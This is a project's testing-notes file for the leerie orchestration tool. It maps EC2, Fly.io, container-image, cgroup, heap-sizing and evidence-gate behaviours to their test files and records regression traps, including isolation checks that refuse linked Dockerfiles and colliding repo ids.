# Testing notes

This file is the per-feature / per-incident testing coverage inventory:
which test file covers which surface, and the specific traps that shipped
once and are now pinned against regressing. It is separated from
`CLAUDE.md`'s `## Testing` section (which keeps only load-bearing
operational rules — concurrency, PATH, subreaper, mid-run-edit,
`jq`/`shellcheck` gating — plus a pointer here) per the "Commit messages
are the permanent record" principle in `CLAUDE.md`: historical per-incident
detail belongs in a durable record, not perpetually accreting in the file
loaded into every session.

No coverage target is set — the suite was introduced from scratch and a
number now would be arbitrary.

## Running the suite

`pytest tests/` from the repo root. Tests cover the deterministic
enforcement functions (`resolve_leerie_root`, `resolve_source_of_truth`,
`resolve_runtime`, `gather_answers` validation gate, `_retryable_failure`,
`check_merge_committed`, `_validate_result`, `_validate_plan`,
`_validate_run_json`, `_derive_run_status`, `_load_blt_config`,
`resolve_blt`), including a coupling test that the retry-policy markers
match the live check-function strings.

**The suite runs in its own HOME.** `tests/conftest.py` points `HOME` at a
fresh temporary directory before any test module is imported, with the git
identity CI sets globally, and an autouse fixture fails any test that
points it back at the user's (`REAL_HOME` holds that path, for a test that
reads a cache there on purpose: the pnpm fallback check uses the user's
corepack cache, without which corepack fetches the newest pnpm). The
launcher resolves its state dir to `$HOME/.leerie/<repo>` and makes `logs/`
there before any verb, so `test_re_seed` and `test_version_flag` wrote
`~/.leerie/_self/logs` and `.owner` into the user's run state; both now
pin `LEERIE_STATE_DIR` to `tmp_path` as well.

## Launcher AWS / EC2 knobs

The `--aws-region`/`--aws-profile` knobs (which region/profile leerie
itself uses when provisioning `--runtime ec2` machines, distinct from the
AWS SDK's own credential-chain env vars) are **launcher-owned**, covered in
`tests/test_resolve_aws_launcher.py`. They were orchestrator-resolved until
2026-08-10, into `args.aws_region`/`args.aws_profile` — which nothing read,
since the orchestrator runs inside the container where a host-side
provisioning region is meaningless. The launcher, the only real consumer,
honoured `LEERIE_AWS_*` alone, so **the documented CLI flag and
`leerie.toml` keys were both silently inert while the env var worked.**
Resolution now runs in the launcher via `_resolve_ec2_knob`, deliberately
**above the top-level verb dispatch** — `accept-blocked`/`stop`/`kill`/
`finalize` each read `LEERIE_AWS_*` inside their own arms, so resolving
beside the `--ec2-*` knobs would have fixed only the main dispatch. The
block is *extracted* from the real launcher by the test rather than
reproduced (see `test_no_duplicate_state_walks.py` for why), and its
load-bearing case asserts the resolved value **reaches the consumer's
argv** (`_aws_region_profile_args`) — the deleted
`tests/test_resolve_aws_prefs.py` pinned the argparse flag and the resolver
and passed for months while the value reached nothing.
`tests/test_no_dead_resolutions.py` generalises that: no
`args.X = resolve_Y(...)` may go unread. It is the sibling
`tests/test_no_dead_functions.py` cannot be — that one scans for
unreferenced *functions*, and these resolvers **were** referenced, by the
dead assignments themselves. Its reader count excludes each assignment's
own RHS (every resolution passes its current value in as the CLI tier);
without that exclusion the sweep reports zero dead resolutions on a tree
that had two.

The launcher-side EC2 instance-shape vars (`LEERIE_EC2_AMI`/
`_INSTANCE_TYPE`/`_KEY_NAME`/`_SECURITY_GROUP`/`_SUBNET_ID`, distinct from
the region/profile prefs above) are covered in
`tests/test_resolve_ec2_vars.py`: the bash `_resolve_ec2_knob` CLI > env >
`leerie.toml` > (no default) ladder — **extracted** from the launcher at
test time by `_extract_resolve_ec2_knob()`, not reproduced. It was a
hand-written copy until 2026-08-10, body-blind *by construction*: the
tests executed a string literal defined in the test file, so no change to
the launcher could reach them, while `test_block_present_in_launcher`
pinned only the helper's name plus the flag/toml-key strings and never its
logic. `tests/test_no_duplicate_ec2_knob.py` keeps it the only
implementation — one of a family of guards of this shape, alongside
`tests/test_no_duplicate_state_walks.py` and
`tests/test_no_duplicate_launcher_splitters.py` (guards the shared
derivation in `tests/launcher_blocks.py`), generalised over eight bash
blocks by `tests/test_no_duplicate_launcher_blocks.py` — with its marker
anchored to the **start of a line**, since a reproduction opens the body at
column 0 while a legitimate reference (`src.index("_resolve_ec2_knob() {")`
inside an extractor) is always quoted mid-line; matching the bare token
would flag the very extractors the guard exists to encourage.

**A falsification trap worth remembering:** the first attempt to prove the
old copy was blind deleted the helper's `[ -f ]` guard, which passes either
way (removing it is behaviourally inert — grep on a missing file already
fails silently). Inverting the CLI/env precedence is the sabotage that
discriminates (5 failures with the extraction, 0 with the copy). A
falsification that changes no observable proves nothing.

Also covered: per-var isolation, `=`-form CLI flags, the env-forwarding
denylist guard (these vars must never leak into the container), and
`ec2-lib.sh`'s `_resolve_ec2_var` required-var-read contract (prints on
success, actionable "not set — required for --runtime ec2" error + rc 1 on
an unresolved var, never a bare `${VAR:?}`).

The zero-config EC2 defaults add one more launcher knob,
`LEERIE_EC2_INSTANCE_PROFILE` (the IAM instance profile attached at
`run-instances`; unset means leerie creates and tags its own). Its
override-wins/creates-nothing contract is pinned in
`tests/test_ec2_defaults.py` (see *EC2 zero-config defaults, AMI bake and
cleanup* below); the sibling `--ec2-*` knobs keep the ladder above.

## EC2 zero-config defaults, AMI bake and cleanup

These files drive the real scripts under `scripts/remote/` against stubbed
`aws`/`ssh`/`sudo` binaries (no network, no real AWS). `tests/conftest.py`'s
`_ec2_tests_isolated_home` gives every EC2 test module a throwaway `HOME`:
`run_bash` merges `os.environ`, and `ec2_default_key_file` writes under
`$HOME/.leerie/.ec2-keys`, so a test leaving `LEERIE_EC2_KEY_NAME` blank once
dropped a stub key into the developer's real home (`~/.leerie`, which is also
the install checkout).

- `tests/test_ec2_ensure_ami.py` (`ec2-ami.sh`'s `ensure_ami`): a cache miss
  bakes in order (stock-AMI lookup, bake instance, payload, stop,
  `create-image`) and the second call is a cache hit with no further
  `run-instances`; a failing payload (`SSH_FAIL`) terminates the bake
  instance and never calls `create-image` (bake teardown on failure);
  SIGINT mid-bake also terminates, and SIGINT while `run-instances` is still
  in flight (no id yet) terminates the instance found by the bake's
  `leerie:bake` nonce tag; the bake launch carries
  `AssociatePublicIpAddress=true` with the subnet/SG override, the nonce tag,
  `-i <key>` on every ssh and `LEERIE_BAKE_REGION` for the payload; the
  sources ship through `ec2_tar_pipe` (`sudo -n sh -c … tar -xzC
  /tmp/leerie-bake`) before the script runs *from that copy* with zero bytes
  on stdin (never `bash -s`), and every bake ssh uses the bake instance's own
  known-hosts file; the image poll outlasts 45 pending states (more than the
  CLI waiter's 40), a `failed` image is deregistered on the first poll, and
  `LEERIE_EC2_AMI_WAIT_S` bounds the wait;
  `LEERIE_EC2_AMI` set makes no AWS call at all; a changed content hash
  (Dockerfile edit under a throwaway repo root) rebakes and tags the new
  image with the new hash. `tests/test_ec2_ami_lookup.py` pins the
  newest-*available* pick with images listed out of date order and a newer
  one still pending, parsed from JSON (no `--query`).
- `tests/test_ec2_bake.py` (`ec2-bake.sh`, the instance-side script): pins
  and apt packages derived from the Dockerfile; the env file derived from
  `ENV` lines, proven on a synthetic Dockerfile whose values exist nowhere
  else (`$PATH` expanded, a `RUN echo ENV …` line ignored), and complete
  against the real one; it is written before, and sourced for, `mise
  install`; `ec2-user` is cloud-init's default user with passwordless sudo
  and no key is baked in — proven by executing the script's own cloud-cfg
  heredoc with a group name and comparing every key; `tmp.mount` is masked
  (disk-backed `/tmp`) before `cloud-init clean`, which runs last; the
  baked `leerie-instance-setup` (container-entry.sh's boot-time half) is
  executed against a fake cgroup root and meminfo and writes the same
  slice memory cap container-entry.sh computes (14 GiB for 16 GiB, the
  1 GiB floor for 4 GiB), honours the `max` opt-out, and re-creates
  `/tmp/.cache` 1777; `leerie-instance-setup.service` is an enabled oneshot
  root unit running that setup, and no broker service exists (the launch
  wrapper spawns the broker and hands over its descriptor); leerie's home is
  chowned after its dirs exist; the SSM agent prefers the regional bucket.
- `tests/test_ec2_defaults.py` (`ec2-defaults.sh`): per knob, the default
  and the override. Instance type; subnet (public subnet in the default VPC,
  override wins with no AWS call, no default VPC fails naming the fix);
  security group (created and tagged `leerie:managed=true`, 22/tcp from the
  egress CIDR only, reused on a second run, a changed egress IP is *added*
  and the old one kept with no revoke, a group with the pre-rename
  `leerie=managed` tag is reused, a same-named group leerie did not create
  is refused, override creates nothing, a `0.0.0.0/0` CIDR is refused); key
  pair (0600 pem under `~/.leerie/.ec2-keys/<account>/<region>/`, never the
  per-repo state dir; a second repo reuses it without error; regions get
  distinct files; legacy-tagged key reused, untagged same-named key refused,
  key-in-AWS-but-pem-missing fails with the fix, override creates nothing);
  instance profile (created and tagged; override wins); with every knob set
  no `create-*` call happens. The transport half pins `ssh -i` ahead of the
  target in the tar-pipe argv, its absence without a known key, the
  fallback to leerie's own key in a process that never received
  `LEERIE_EC2_SSH_KEY_FILE`, no guess for an operator key, and the rsync
  ssh wrapper. A region set only through `AWS_DEFAULT_REGION` (which
  preflight accepts and `aws configure get` never reads) still resolves the
  key path via `_ec2_region`; a key pair left by the per-repo layout has its
  pem moved into place with no new key pair created; and the known-hosts
  file is per instance id at `ec2_tar_pipe`, `_ec2_fetch_ssh` and the rsync
  wrapper, differs for another instance, and is absent without an id.
- `tests/test_ec2_provision.py`: `provision_instance` leaves
  `LEERIE_EC2_SSH_KEY_FILE` set in the *calling* shell, so the later seed
  and fetch ssh calls carry `-i` (the defect: the key pair was resolved in
  `$(...)` and its export died with the subshell); `run-instances` retries
  while EC2 rejects a just-created profile (`InvalidParameterValue` naming
  `iamInstanceProfile`), not on other errors, not without a profile, and
  only within `LEERIE_EC2_IAM_RETRY_BUDGET_S`.
- `tests/test_ec2_transport.py`: `ec2_remote_exec` runs its command as
  `sudo -n bash <decoded file>`, fails (not a silent success) when sudo is
  refused and no rc sentinel comes back, and `ec2_tar_pipe` extracts under
  `sudo -n`; the fetch ssh and rsync receiver are elevated too. Neither
  transport lands as root (DESIGN §6).
- `tests/test_ec2_decide_teardown_auto_finalize.py` and
  `tests/test_decide_teardown_auto_finalize.py` pin that neither teardown
  is a second owner of the push choice (DESIGN §6 *One push choice per
  run, on every runtime*): a sidecar `host_no_push` (true or false) or
  `NO_PUSH=true` on the tearing-down launcher leaves the ordered calls at
  fetch → `host_finalize` → terminate/destroy, `host_finalize` being the
  reader of `run.json.no_push` (whose skip `tests/test_remote_push_choice.py`
  drives). `tests/test_ec2_provision.py` pins that `provision_instance`
  writes no push field into `ec2-instance.json`.
- Both teardown files also pin the launcher's STAGE-cleanup hook
  (`_remote_launcher_exit_cleanup`): it runs once, last, on the `exit`
  pass (after an INT-style pass that skips it), also when the
  machine/instance is left running after a failed sync, and an INT pass
  alone keeps STAGE — a Ctrl-C the launcher survives must not strip the
  credentials seeding still needs. `tests/test_teardown_trap_registration.py`
  drives the real `provision_machine` / `provision_instance` and reads the
  traps they leave: EXIT is `decide_*teardown exit`, INT and TERM the bare
  form; the two resume paths carry the same split.
  `tests/test_ec2_launch_env.py` executes the launcher's real hook — the
  keepalive is killed and STAGE removed — runs it under `set -u` with
  nothing staged, and as an EXIT trap under `set -euo pipefail` with the
  keepalive already gone (bash 3.2 used to end the trap on the failed
  `kill` and leak STAGE); the launcher's three STAGE traps each tolerate
  a failed `kill`. Without it every remote run leaked a
  `cfg-*` dir of staged credentials (DESIGN §6 *Finalization parity*).
- `tests/test_ec2_launch_env.py` also pins that the shared launch suffix
  forwards the orchestrator argv unchanged (no `--no-push` of its own, so
  `resume <run-id>` keeps the verb first — a leading flag once made a real
  EC2 resume reject its own run id), and that the orchestrator splits the
  run id off a forwarded `resume` argv.
- `tests/test_ec2_launch_env.py`: renders the launcher's EC2 `child_env`
  heredoc and executes it: the baked `leerie.env` overrides the session env,
  splits on the first `=`, and the wrapper's own `HOME`/`USER_REPO`/`TZ` win
  after it; an operator AMI without the file keeps the session env.
- `tests/test_ec2_resume_instance.py`: resuming from a new egress IP adds it
  to the leerie group *attached to that instance* (old rule kept), after the
  start and before the ssh target is resolved, even when the resuming shell
  has no group id; an attached operator group is never changed and no group
  is created; an already-admitted IP changes nothing.
- `tests/ec2_stub.py`'s shared SSM stub refuses (exit 97) any command not in
  the exact `sudo -n bash <file>` wrapper shape, so the provision, seed and
  fetch tests exercise the real elevated wrapper, not a lenient decode.
- `tests/test_launcher_env_forwarding.py`: every launcher-only EC2 knob
  (the six instance-shape knobs plus the key file, SSH CIDR, IAM retry, AMI
  wait and bake budgets) stays out of the local container, with a control
  showing the same harness forwards an ordinary knob.
- `tests/test_ec2_cleanup.py` (`ec2-cleanup.sh` and `leerie prune`'s AWS
  section): tagged-only prune. The stub ignores `tag-key` filters, so
  untagged lookalikes reach the script and its client-side re-check is what
  is exercised. Dry-run is the default and changes nothing; `--apply`
  removes exactly the tagged set (and leerie's own pem at its
  account/region path); an untagged snapshot of a tagged AMI, an
  AMI in use by a live instance, a still-attached security group and an
  in-use or untagged IAM role are all left alone; `--keep-current` spares
  only the matching AMI; report mode never deletes; unknown options are
  rejected before any AWS call. Launcher integration: `prune` without
  credentials skips AWS and succeeds, with credentials a dry run lists
  tagged resources and deletes nothing, `--apply` deletes tagged only.

`tests/test_ec2_decide_teardown_auto_finalize.py` pins `decide_ec2_teardown`'s
clean-exit order (fetch, finalize, terminate): finalize failure leaves the
instance running, an unfinished run skips finalize but terminates, a sync
failure or non-clean rc never finalizes, and rc 130 (detach) neither
finalizes nor terminates. It parses `run.json` with real `jq`, so it is
gated on `HAS_JQ` (module-level `skipif`); `tests/test_jq_gate_wiring.py`
lists it in `GATED_MODULES` and asserts it imports `HAS_JQ` and carries the
`skipif`, so the file skips cleanly in the jq-less image instead of failing.

## Fly.io remote surface

The remote (Fly.io) bash surface — `ensure_image`, `provision_machine`,
`stop_machine`, `decide_teardown`, `resume_machine`, and `lib.sh`'s
`update_run_json` — is tested via bash-harness subprocess tests with
stubbed `flyctl`.

Fly **volume** reaping is covered in `tests/test_provision_volume.py`: Fly
volumes outlive their machines by design (no platform-side lifecycle hook
— *"a Machine can be destroyed without destroying its volume"*), so every
path that kills a machine must reap the volume itself, and three paths
silently did not. The tests pin `destroy_volume` reaping with an **empty**
`LEERIE_MACHINE_ID` (it must not live behind `destroy_machine`'s early
return — that made the volume block unreachable exactly when the machine
had already died); `_resolve_volume_id_from_run_dir` **falling through** a
`fly-machine.json` that lacks `volume_id` to `run.json` (provision writes
the former conditionally, the latter always); `_resolve_volume_id_from_fly`
reading `config.mounts[].volume` out of `machine list --json` (the stub
emits the shape measured against a live machine — `machine status` has no
`--json` flag, so it is deliberately unused); and end-to-end that
`kill --machine-id <id>` with **no run dir** still reaps, with the
load-bearing ordering asserted by call index: **Fly lookup → machine
destroy → volume destroy** (the volume→machine link vanishes with the
machine, but Fly refuses to destroy a still-attached volume, so the reap
must sit between those two events). Harness note: the launcher's state-dir
override is `LEERIE_STATE_DIR`, **not** `LEERIE_STATE_HOST_DIR` — setting
the latter silently resolves to the real `~/.leerie/...` and the test
asserts nothing.

The local per-repo image surface — `resolve_repo_image_tag`,
`_leerie_repo_id`, `build_repo_image`, and `ensure_base_in_worker_ns`
(copies the base from leerie's containerd namespace into the one BuildKit's
worker reads, `default` in the harness's `buildctl` stub, before the derived
build so `FROM $BASE_IMAGE` resolves locally; `tests/test_build_repo_image.py`
pins that the copy fires and precedes the build, the skip when the copy
there has the base's id, and the copy again when its id differs) — is
tested via bash-harness subprocess tests with stubbed `git`, `nerdctl` and
`buildctl`.

Leerie's generated Dockerfile is tested only by its own build (DESIGN §6½
*Language deps*; review round 35, execution R35E-1), in
`tests/test_build_repo_image.py`: a launch whose generated file, context,
version and base match the recorded image runs no build at all, and the
one that builds runs the repository image's two builds and nothing else
(`test_an_up_to_date_generated_image_runs_no_build`); when the generated
file's build fails (a stub `nerdctl` that fails a file holding a
`# copy-input-shas:` line, builtins only), the launch warns, builds the
file without the language-dep layer, and records that image under the
generated file's key, so the next launch runs no build and keeps the key
(`test_a_language_layer_that_does_not_build_falls_back_once`). Both fail
at the parent tree, where a probe build ran on every launch before the
rebuild check (3 builds and then 1). Review round 36 (execution X3): the
fallback's record carries the `apt-only` mark, its warning names the
`.dockerfile-hash` path to remove and no longer says "for this run", and
the next two launches each warn that the image is the apt-only fallback;
an image whose layer built is recorded unmarked and reused without that
warning (in `test_an_up_to_date_generated_image_runs_no_build`).
Falsified live (measured 2026-11-03), each restored: the mark not
written, the reuse warning removed, the mark written for every image, and
the old wording each fail their case.

An image is keyed on the repository Dockerfile bytes leerie read (review
round 29, isolation F4): with a committed `.leerie/Dockerfile` linked to a
file outside the checkout, the reuse block refuses the link before any
reuse decision even when the stored hash is that file's digest and the image
is present (`tests/test_resolve_repo_image_tag.py::test_a_linked_dockerfile_is_never_read_nor_reused`),
and `_set_fly_per_repo_image` names no Fly tag from that file's digest
(`tests/test_fly_per_repo_image.py::test_a_linked_dockerfile_is_never_read`).
Falsified: with the digest taken by path (`sha256sum`) again, each fails —
the local block reports the image up to date and runs it, and the Fly tag
carries the linked file's digest. In a full launch `_checkout_config_links`
refuses a linked `.leerie/Dockerfile` first; these pin the sites
themselves.

A repository image is only its own checkout's (review round 29, isolation
F2; `tests/test_resolve_repo_image_tag.py`): checkouts whose `<repo-id>`
collide (`github.com/alice/app`, `evil.example/alice/app`, a directory
named `alice-app`) get three distinct names; an image reused is run by the
digest recorded when this checkout built it (`REPO_IMAGE_REF`); a tag that
names another digest is rebuilt and the new digest recorded and run; a hash
file that records no digest reuses nothing. The shared `nerdctl` stub
(`tests/repo_image_block_extract.py`) answers the repository image's
`RepoDigests` with `$STUB_REPO_DIGEST`, present once a harness's `build`
branch has run. Falsified: with the launcher before this change, all four
fail.

On Fly, an image is pushed under exactly the tag asked for and a machine
starts from the digest leerie pushed (review round 29, isolation F1).
`tests/test_build_push_modes.py`: the remote builder's `--image-label` is
the requested tag's label; a tag outside `registry.fly.io/<app>` is refused
before flyctl runs; `--digest-file` records the digest a registry holds
under the tag; `--layout-base` refuses a pushed image that is not the
base's layers plus one with its configuration, and reports no digest for
it; `--no-run` builds and pushes a repository's own stage without the
local build's entrypoint check and smoke run, which start it (2 cases;
fails with the guard removed), and `--target` is an unknown argument
(fails with it accepted again). `tests/test_registry_image.py` drives `scripts/remote/registry_image.py`
against `tests/fake_registry.py` (a loopback registry behind a Bearer token
challenge): the digest, a registry whose digest disagrees with the body,
the layout rule and each way to break it, labels left out, a linux/amd64
pick from an index. `tests/test_fly_per_repo_image.py` and
`tests/test_ensure_image.py` run the launcher's `ensure_image`: the cache
records `<tag> <digest>` (and the base digest for a repository image); a
repository image is two pushes (DESIGN §6 *One image, two roots*): the
repository's Dockerfile, byte for byte, on the base's digest under
`<tag>-repo` with `--no-run` and no target, then leerie's, `FROM` the base's
digest and that push's digest, under its own tag with `--layout-base`; it is rebuilt when cached on another base; a
cached tag without a digest is no hit; and the Fly branch hands
`provision_machine` the digest reference. Falsified: with `build-push.sh`
before this change, 7 of `test_build_push_modes.py`'s tests fail; with the
launcher before it, the Fly-branch wiring test and every new
`ensure_image` test fail. A repository image cached in another layout, or
with none recorded, is rebuilt
(`test_ensure_image_per_repo_in_another_layout_is_rebuilt`; fails with the
layout condition dropped), and a run the launcher started on a repository
image whose image has no worker root stops before anything runs
(`tests/test_worker_root_view.py::test_a_run_started_on_a_repository_image_needs_its_worker_root`;
fails with the check removed) (review round 29, execution L2).

## Worker cgroup containment

Worker cgroup containment (DESIGN §6 *Memory containment*) is tested in
two files: `tests/test_cgroup_helpers.py` covers the orchestrator-side
broker clients (`_cgroup_probe`/`_cgroup_create`/`_cgroup_enroll`/
`_cgroup_destroy` via a stubbed socket round-trip) and the fail-closed
`_enforce_and_record_cgroup_containment`; `tests/test_cgroup_broker.py`
covers the root broker (`scripts/cgroup-broker.py`) — protocol dispatch,
sid validation, v1/v2 path selection, and the startup **orphan sweep** —
against a fake cgroupfs.

Neither can catch **wire-protocol drift between the two**, which
`tests/test_broker_wire_contract.py` exists for: the broker composes
`slice` (4 tokens) and `stat` (5) while the orchestrator parses them, the
field count is hand-written on both sides, and until that file nothing
compared them. Drift is silent in the worst way — both parsers return
`None` on a mismatch and `None` legitimately means "containment is off",
so a drifted `slice` makes worker sizing fall back to `/proc/meminfo`
**and** turns the admission gate into a no-op, while a drifted `stat`
disables PID-exhaustion detection and memory-OOM naming, with nothing
logged and no test failing. The existing two cannot see it by
construction: `test_cgroup_helpers.py` feeds leerie's parser hand-written
fixture strings (parser vs. fixture, not parser vs. broker) and
`test_cgroup_broker.py` never touches leerie's parsers. The contract file
is the only place the two meet — the **real** broker's emitted string fed
to the **real** leerie parser, with the socket the only thing stubbed —
and it carries an anti-vacuity test proving the guard fires on an
added/removed field, plus a transposition check (right arity, wrong order)
driving the parsed values into `_worker_memory_ceiling` and the headroom
comparison. Same class as the `collect-subtrees.sh` schema duplication
elsewhere in this file, which had already drifted in production before its
guard existed.

The burst-reservation state `_active_admissions` (token → monotonic stamp,
mutated by `_await_worker_memory_admission` and
`_release_worker_memory_admission`) is **module-level** and conftest's
`leerie` fixture is **session-scoped**, so `tests/test_slice_aware_memory.py`
clears it in an autouse fixture on both sides — without that its burst
tests are order-dependent and leak reservations into every other file that
exercises the gate; a guard-the-guard test source-couples to the fixture's
`scope="session"` so a scope change forces that reasoning to be
re-examined.

`tests/test_memory_admission_degrade.py` covers the **first** admission
stage, `_degrade_max_parallel_for_wave` — the synchronous wave-entry
shrink that sizes a wave's `asyncio.Semaphore` to real headroom so the
blocking gate rarely has to act. It carries the same autouse
`_active_admissions` reset, and its load-bearing test is
`test_uses_the_same_signal_as_the_blocking_gate`: the degrade and the gate
must both read `slice_max - unreclaimable`, because two signals could
disagree about one slice — sizing a wave down against page-cache pressure
the gate then admits into. `test_is_synchronous_not_a_per_spawn_gate`
strips the docstring via `ast` before scanning for `await`: the docstring
names `_await_worker_memory_admission` on purpose, and a naive substring
check matches the prose describing the thing it forbids (the same trap the
zombie-reaper guard documents below). Those burst tests use the
**measured** production density (15 worker starts per 180 s, from real
runs' `calls.ndjson`) rather than an assumed number: an earlier revision
bounded reservations by elapsed time instead of by worker lifetime, which
stalls every real run — its tests used 5, under `max_parallel`, and passed
against the defect, which first bites at 9.

## Repo-declared heap reconciliation

The **repo-declared-heap reconciliation** (N14-16, DESIGN §6 — a repo's
own `--max-old-space-size` overrides whatever heap Node would infer from
the cgroup, so the per-worker ceiling must be reconciled against it) is
covered by `tests/test_worker_heap_ceiling_reconcile.py` and
`tests/test_worker_memory_heap_reconcile.py`, with the P9 `NODE_OPTIONS`
injection in `tests/test_node_options_injection.py` and the resolver chain
in `tests/test_resolve_worker_memory_max.py`. Four traps here are not
obvious from the test names.

1. **The two error directions are not symmetric, and the asymmetry sets
   which tests matter.** The declared heap RAISES the cage
   (`needed = declared_heap + _NODE_HEAP_HEADROOM_BYTES`), so
   over-detecting a script name only inflates the cage and throttles
   admission, while MISSING one under-sizes it and the worker OOMs — the
   failure the whole reconciliation exists to prevent. `_pm_script_candidates`
   is therefore deliberately over-inclusive, and three narrowings (abandon
   on `exec`/`dlx`, stop at `--`, drop `npx`) were prototyped and rejected
   because each introduced misses; `test_candidate_extraction_stays_over_inclusive`
   pins that intent at the unit, including a block of rows guarding shapes
   `_SEG_RE` must not break (`2>&1`, `&` inside an argument, a PM after the
   separator) — those pass under both the current and the superseded
   implementation on purpose, as a guard against the next edit to that
   regex, not a second proof of the fix.
2. `_SEG_RE` **splits before tokenising**, because testing each
   whitespace-split token against a separator set cannot see `build&&node`
   (one token); the old form lost the real script on every space-free
   separator.
3. **A config.toml fixture cannot reach the real code path** — measured
   across the five repos leerie manages, 2 of 5 declare a heap in
   `package.json` and **0 of 5** in `.leerie/config.toml`, so the original
   config.toml-only suite reported full coverage while the reconciliation
   fired on none of them. The second half of the file builds
   `package.json` fixtures for that reason. A related trap: `_write_config`
   interpolates into a TOML **basic string**, so a command containing a
   literal newline produces invalid TOML, the whole config is silently
   dropped, and the assertion is answered by BLT inference instead — one
   parametrization passed that way while testing nothing, which is why the
   newline case is asserted at the unit rather than end-to-end.
4. **`_NODE_HEAP_HEADROOM_BYTES` needs its own value pin.** Both P9's
   injection and the reconciliation derive from it (mirror images of one
   quantity that briefly disagreed, handing Node a heap 384 MiB larger
   than fits the cage), which is the coupling we want — but every
   assertion moves with the constant: setting it to `243 * 1024 * 1024`
   once left the entire suite green. `test_node_heap_headroom_is_2432_mib`
   anchors the value, and the AST pin resolves the reserve **name's
   binding** rather than merely requiring an `ast.Name`, so
   `reserve_mb = 2432  # <const>` fails.

`tests/test_decompose_share_advisory.py` covers `_warn_decomposition_share`,
whose one non-obvious test is the partial-caps case: every other test
supplies `max_total_workers`, so the `.get()` fallback is only exercised
by a caller that omits it (`run_recapture_deps`, `run_rebaser`,
`_replay_capture` each build their own minimal caps) AND only on the
branch that runs when the warning fires.

## Production-grounded evidence gate

The **production-grounded evidence gate** (DESIGN §9 — every other gate
asks whether the code matches its specification, none asks whether the
specification matches reality) is covered by
`tests/test_production_evidence.py` and `tests/test_unreviewed_subtasks.py`.
Three traps are not obvious from the test names.

1. **The field is optional in the schema and gating in the check, and
   that is ONE decision, not two.** Requiring it costs the entire
   submission rather than the one field — `_confidence_schema`'s docstring
   records that measured at 40.9% valid on `plan_overlap_judge`, with 84 of
   its 85 failures being a single required field — while gating on absence
   is what stops "optional" from meaning "ignorable".
   `test_schema_field_is_optional_at_the_top_level` and
   `test_absent_evidence_gates` are anti-vacuity partners: remove either
   and the field becomes decorative. The object is also flat with one
   required inner bool for the same decoder-corruption reason
   (anthropics/claude-code#49747).
2. **The conformer's copy must be READ, not merely declared.** It shipped
   once as a dead field — on both schemas, with exactly one call site and
   no mention in `conformer.md` — while DESIGN and IMPLEMENTATION both
   described it as consumed. It is wired **advisory** (extends
   `conf_warnings`, never `blocked_reason`), because `solution_defects` is
   deliberately the one gating conformer axis and an advisory phase must
   not gain a new way to stop a run; `test_conformer_side_is_advisory_not_gating`
   pins the distinction by inspecting the statement, not just the call.
3. **Source scans here strip comments first.** Both
   `conformance[sid] = {...}` write sites carry comments naming
   `unreviewed_subtasks` while explaining why one of them must not touch
   it, so a raw substring scan matches the prose describing what it
   forbids and fails on correct code — the same trap the zombie-reaper
   guard documents. The helper also bounds each site at its closing
   `st.save()` rather than by a character count: a fixed window was tried
   twice and truncated mid-statement both times, reporting a key as
   missing when it was merely past the cutoff. The two write sites mean
   different things — the mid-run satisfied-rescue sentinel sets
   `reviewed: False` but is deliberately excluded from
   `unreviewed_subtasks`, since a zero-commit subtask has no diff to
   review and folding it into the operator warning is how a warning
   becomes noise.

`tests/test_symptom_evidence.py` covers `check_symptom_evidence`, the
sibling — scoped by the planner's `fixes_reported_symptom` declaration,
never by an id prefix — that asks whether the reported symptom still
reproduces on the base tree. Run fa979580's N18 subtask re-fixed a leak an
earlier PR had already fixed, shipping an event-loop stall on the way.
Three traps:

1. **It is advisory and must stay that way**: the output never reaches
   `check_implementer_output`, because those issues drive
   `implementer_confidence_retries` and a retry cannot make a stale
   finding un-stale — it asks the same worker the same question — while a
   second *gating* evidence field would stack retry pressure on the
   production-evidence gate. `test_not_wired_into_the_gating_check` is the
   pin. Advisory does NOT mean ephemeral: the findings are also persisted
   to `symptom_findings` in `state.json` (results are in-memory only —
   `phase_execute` writes just `blocked` reasons out of them), cleared for
   a sid whose later attempt reports cleanly so a re-driven subtask
   carries no stale entry, and surfaced by `phase_finalize` for the
   `SYMPTOM_DID_NOT_REPRODUCE` case ONLY — `NO_SYMPTOM_EVIDENCE` is worker
   hygiene and a summary line that fires every run is how a warning stops
   being read.
2. **"The new tests fail on base" is NOT this and is worthless** —
   measured on that run all four findings' tests already failed on base (9
   of 13 for one), because a new test against absent code trivially
   fails; the field therefore asks for a command and an observation, not a
   bare boolean.
3. **Scoped by the planner's `fixes_reported_symptom` declaration**, never
   by the subtask's id — that was the original design and it produced 10
   of 10 false positives, because `_repair_prescribed_commands` mints ids
   from the HOST subtask's domain and a merge re-homes a `feat-` subtask
   under a surviving `bugfix-` id. *Language-to-JSON* is usually read as
   being about prose, but an identifier is a string too. The `sid` still
   comes from the ORCHESTRATOR, never from the worker's echoed
   `result["subtask_id"]` — nothing in the module cross-checks that echo,
   which is precisely why the id is not the scope signal. Taking the sid
   string rather than the subtask dict also removes a `None`-dereference
   by construction, and neither this check nor `check_implementer_output`
   coerces a bad argument (`sid or ""`, `subtask or {}`): both shapes
   swallow a contract violation and leave the check silently disabled —
   measured, an empty subtask dict makes `NO_PLANNED_FILES_TOUCHED` unable
   to fire — so both raise instead, each pinned by its own non-coercion
   test.

The same change wired `check_production_evidence` into
`_run_final_conformance` — #197 wired the per-subtask site and missed the
whole-tree pass, which is the last gate before a run is declared done and
the one that certified four inert fixes at confidence 8.5. It runs after
`_validate_conformance_result` so a shape-rejected payload is not also
reported as missing a field.

## Memory-OOM naming and PID reaping

Memory-OOM naming (DESIGN §6 *Detecting memory OOM*) — the `empty_handoff`
seam that prefers a worker's named OOM cause (offending command +
`memory.max`) over `_validate_result`'s generic "checkpoint ... does not
exist" text — is pinned end-to-end through `_settle_subtask` in
`tests/test_oom_naming.py`: both empty_handoff branches (the no-commits
`fail()` path and the has-commits rescue path that keeps the diff and logs
instead of discarding it) surface the named cause when
`_run_implementer`'s synthesized `incomplete-handoff` envelope carries
one, including the `--worker-memory-max` / `--max-parallel` remediation
pointer; a healthy no-op empty_handoff (no named cause) does not fabricate
an "OOM-killed" message.

Mid-run PID reaping (DESIGN §6 *Mid-run PID reaping*) is tested in
`tests/test_signal_cleanup.py`: `_reparented_orphans` selects only
alive+ppid==1+old PIDs sorted oldest-first (stubbed ps); `_poll_loop` reaps
only at ≥90% pressure and stops below 75% (hysteresis); below 90% is a
byte-identical no-op; attached (ppid!=1) PIDs are never reaped; and a
structural guard pins `cgroup_sid: str | None = None` on
`_DescendantTracker.__init__` so the 3 pre-existing direct-constructor call
sites remain compatible after the parameter was added.

